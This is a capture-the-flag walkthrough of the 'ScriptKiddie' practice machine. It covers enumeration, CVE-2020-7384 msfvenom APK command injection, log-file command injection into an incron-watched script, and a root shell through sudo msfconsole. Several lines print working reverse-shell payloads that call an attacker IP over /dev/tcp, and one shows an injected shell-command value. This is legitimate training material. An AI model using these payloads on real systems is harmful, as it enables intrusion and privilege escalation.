# ScriptKiddie

export IP=10.10.10.226

## Solution

Lets start the standard nmap scan 

```
cmd:sudo nmap -vvv -sC -sV -oN nmap/init $IP

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/YB1g/YHwZNvTzj8lysM+SzX6dZzRbfF24y3ywkhai4pViGEwUklIPkEvuLSGH97NJ4y8r9uUXzyoq3iuVJ/vGXiFlPCrg+QDp7UnwANBmDqbVLucKdor+JkWHJJ1h3ftpEHgol54tj+6J7ftmaOR29Iwg+FKtcyNG6PY434cfA0Pwshw6kKgFa+HWljNl+41H3WVua4QItPmrh+CrSoaA5kCe0FAP3c2uHcv2JyDjgCQxmN1GoLtlAsEznHlHI1wycNZGcHDnqxEmovPTN4qisOKEbYfy2mu1Eqq3Phv8UfybV8c60wUqGtClj3YOO1apDZKEe8eZZqy5eXU8mIO+uXcp5zxJ/Wrgng7WTguXGzQJiBHSFq52fHFvIYSuJOYEusLWkGhiyvITYLWZgnNL+qAVxZtP80ZTq+lm4cJHJZKl0OYsmqO0LjlMOMTPFyA+W2IOgAmnM+miSmSZ6n6pnSA+LE2Pj01egIhHw5+duAYxUHYOnKLVak1WWk/C68=
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJA31QhiIbYQMUwn/n3+qcrLiiJpYIia8HdgtwkI8JkCDm2n+j6dB3u5I17IOPXE7n5iPiW9tPF3Nb0aXmVJmlo=
|   256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOWjCdxetuUPIPnEGrowvR7qRAR7nuhUbfFraZFmbIr4
5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 0.16.1 (Python 3.8.5)
| http-methods:
|_  Supported Methods: GET OPTIONS POST HEAD
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Lets also leave an all port scan in the background... <br>

The server itself, running using Werzeug, is not vulnerable but allows to run some commands ! <br>

* nmap scan (with an input field for the address), it accepts the address well but does not allow bypass 
  * Example: 127.0.0.1 && $(whoami) -> invalid ip
* searchsploit search (with input for the search parameter), it does not allow bypassing, also
  * Example: werzeug && #(whoami) -> stop hacking me - well hack you back

The only thing last available is the meterpreter generator which accepts:
* Os: [windows,linux,android]
* lhost: textfield (also not bypassable)
* template file (optional)

After thinkering aroud, and because i do not have many experience with metasploit and meterpreter, i just went searching for stuff <br>

Found a cve: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7384  and https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md<br>

The exploit crafts a special .APK executable that allows to run arbitrary code when generating the new payload. This requires metasploit <= 6.0.11 which is pretty recent, and since we cannot see the version and have nothing more, just might try it <br>

The exploit was creating the .APK file, but when sending to the server it was not creating the reverse shell, so i went ahead and searched a bit more and turns out that metasploit already have this exploit, and so using it to create the .APK worked out !! <br>

```
cmd: whoami && id

> kid
> uid=1000(kid) gid=1000(kid) groups=1000(kid)

cmd: ls -la
lrwxrwxrwx  1 root kid     9 Jan  5 20:31 .bash_history -> /dev/null
-rw-r--r--  1 kid  kid   220 Feb 25  2020 .bash_logout
-rw-r--r--  1 kid  kid  3771 Feb 25  2020 .bashrc
drwxrwxr-x  3 kid  kid  4096 Feb  3 07:40 .bundle
drwx------  2 kid  kid  4096 Feb  3 07:40 .cache
drwx------  4 kid  kid  4096 Feb  3 11:49 .gnupg
drwxrwxr-x  3 kid  kid  4096 Feb  3 07:40 .local
drwxr-xr-x  9 kid  kid  4096 Feb  3 07:40 .msf4
-rw-r--r--  1 kid  kid   807 Feb 25  2020 .profile
drwx------  2 kid  kid  4096 Feb 11 22:12 .ssh
-rw-r--r--  1 kid  kid     0 Jan  5 11:10 .sudo_as_admin_successful
-rw-------  1 kid  kid  4759 Feb 11 21:54 .viminfo
drwxrwxr-x  5 kid  kid  4096 Feb 11 20:54 html
-r--------  1 kid  kid    33 Feb 11 20:50 user.txt

cmd: cat user.txt
FLAG: 0c1aac7d0e81fa00a29e5004bc660d55
```

Running linpeas could found
```
Port 53 open (well, it is dns)
/home/pwn <- other user folder
```

in the pwn folder, there is a shell script (scanlosers.h)
```
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/

cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

This script is the result of a "functionality" in the webpage when trying to bypass the searchsploit textbox (as seen before). <br>

The web-application stores the ip address in the file (<b>/home/kid/logs/hackers</b>) and then performs the nmap scan on that IP address <br>
```
def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8','ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")
```

The script is ran automatically when modified which is identifiable with the following simple test
```
cmd: echo "  ;bash -c "touch ~/test' #" >> hackers

cmd: ls -la /home/pwn/

-rwxrwxr-- 1 pwn  pwn   250 Jan 28 17:57 scanlosers.sh
-rw-r--r-- 1 pwn  pwn     0 Feb 15 13:59 test
```

Now, this behaviour is automatic, which indicates that there is a watcher on the file... since there is incron running (lipeans identified that), and we cant check for user pwn from kid's account, lets just assume it is for that file <br>

Also checked for cron/systimers/inotify but could not extract any evidence that was one of those... <br>

Adding the following payload will give us a reverse shell as <b> pwn </b> user (since the script is ran as him/her)
```
cmd: echo '  ;/bin/bash -c "bash -i >& /dev/tcp/10.10.16.5/1515 0>&1" #' >> hackers

cmd: whoami && id

pwn
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
```

Now, to clear our doubts regarding incron, lets check
```
cmd: incrontab -l

/home/pwn/recon/	IN_CLOSE_WRITE	sed -i 's/open  /closed/g' "$@$#"
/home/kid/logs/hackers	IN_CLOSE_WRITE	 /home/pwn/scanlosers.sh
```

It's confirmed, the incrontab has a watcher in the file and executes the script when IN_CLOSE_WRITE happens (when saved and closed) <br>

Now, checking the tipical privesc thing we got an interesting result
```
cmd: sudo -l

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole

```
Well, we can just reverse shell from Metasploit and is done
```
cmd: sudo msfconsole 
cmd: whoami (on msfconsole shell)
root

cmd: /bin/bash -c "bash -i >& /dev/tcp/10.10.16.5/1414 0>&1"(on msfconsole shell)
cmd: whoami && id (on local shell)
root
uid=0(root) gid=0(root) groups=0(root)

cmd: cat /root/root.txt
FLAG:e95ad979953447ab74cdc5ae0765d9c9
```
